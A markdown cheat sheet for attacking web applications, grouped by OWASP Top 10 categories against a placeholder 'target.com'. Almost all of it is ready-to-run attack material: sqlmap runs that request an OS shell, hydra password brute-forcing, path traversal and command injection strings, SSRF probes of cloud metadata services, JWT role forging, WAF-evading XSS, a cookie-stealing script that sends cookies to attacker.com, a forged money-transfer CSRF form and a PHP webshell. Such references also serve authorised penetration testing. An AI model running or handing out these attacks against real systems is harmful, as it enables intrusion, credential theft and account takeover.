# Web Application Attack Reference

## Reconnaissance

```bash
# Subdomain enumeration
subfinder -d target.com
amass enum -passive -d target.com

# Directory brute force
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Technology detection
whatweb https://target.com
wappalyzer https://target.com
```

## OWASP Top 10 Attacks

### A01: Broken Access Control

```bash
# IDOR testing
curl https://target.com/api/users/123
curl https://target.com/api/users/124  # Try different ID

# Privilege escalation
curl -X POST https://target.com/api/admin/users \
  -H "Authorization: Bearer <low-privilege-token>"

# Path traversal
curl "https://target.com/files?name=../../../etc/passwd"
```

### A02: Cryptographic Failures

```bash
# Check for weak ciphers
nmap --script ssl-enum-ciphers -p 443 target.com

# Test for sensitive data exposure
curl -v https://target.com 2>&1 | grep -i "password\|token\|key"
```

### A03: Injection

#### SQL Injection
```bash
# Basic detection
sqlmap -u "https://target.com/page?id=1" --batch

# Extract databases
sqlmap -u "https://target.com/page?id=1" --dbs

# Get shell
sqlmap -u "https://target.com/page?id=1" --os-shell

# POST injection
sqlmap -u "https://target.com/login" --data="user=admin&pass=*" --batch
```

#### XSS
```bash
# Reflected XSS
ffuf -u "https://target.com/search?q=FUZZ" -w payloads/xss.txt

# Stored XSS
# Insert <script>alert(1)</script> in all input fields
```

#### Command Injection
```bash
# Test for command injection
; whoami
| whoami
`whoami`
$(whoami)
```

#### SSRF
```bash
# Internal service discovery
curl "https://target.com/proxy?url=http://127.0.0.1:8080"
curl "https://target.com/proxy?url=http://169.254.169.254/latest/meta-data/"
```

### A05: Security Misconfiguration

```bash
# Check default credentials
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com ssh

# Check for debug endpoints
curl https://target.com/debug
curl https://target.com/actuator
curl https://target.com/.env

# Check for exposed admin panels
ffuf -u https://target.com/FUZZ -w admin_panels.txt -mc 200
```

### A07: Authentication Failures

```bash
# Brute force login
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid credentials"

# Bypass 2FA
# Try replaying session without 2FA token
# Check if 2FA is enforced on all endpoints
```

### A10: SSRF

```bash
# Cloud metadata
curl "https://target.com/proxy?url=http://169.254.169.254/latest/meta-data/"
curl "https://target.com/proxy?url=http://metadata.google.internal/"

# Internal ports
for port in 80 443 8080 8443 3306 5432 6379 27017; do
    curl -s "https://target.com/proxy?url=http://127.0.0.1:$port" | head -1
done
```

## API Attacks

### REST API
```bash
# Enumeration
curl https://target.com/api/v1/users
curl https://target.com/api/v1/admin

# JWT manipulation
# Decode JWT
echo "eyJhbGciOiJIUzI1NiJ9..." | base64 -d

# Change role
{"sub":"admin","role":"admin","iat":1234567890}

# Replay with modified JWT
curl -H "Authorization: Bearer <modified-jwt>" https://target.com/api/admin
```

### GraphQL
```bash
# Introspection
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name}}}}"}'

# Find hidden queries
gqlint https://target.com/graphql
```

## Bypass WAF

```bash
# Case variation
<ScRiPt>alert(1)</ScRiPt>

# Encoding
<script>alert(1)</script>
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;

# Double encoding
%253Cscript%253E

# Chunked transfer
Transfer-Encoding: chunked

# HTTP/2 smuggling
```

## Session Attacks

```bash
# Session fixation
# Force session ID
curl -b "SESSIONID=attacker-controlled" https://target.com/login

# Session hijacking
# Steal cookie via XSS
document.location='http://attacker.com/steal?c='+document.cookie

# CSRF
# Create malicious form
<form action="https://target.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
```

## File Upload Attacks

```bash
# Bypass file type check
# Rename shell.php to shell.php.jpg

# Upload webshell
# Create PHP shell
<?php echo system($_GET['cmd']); ?>

# Access uploaded shell
curl "https://target.com/uploads/shell.php?cmd=whoami"
```
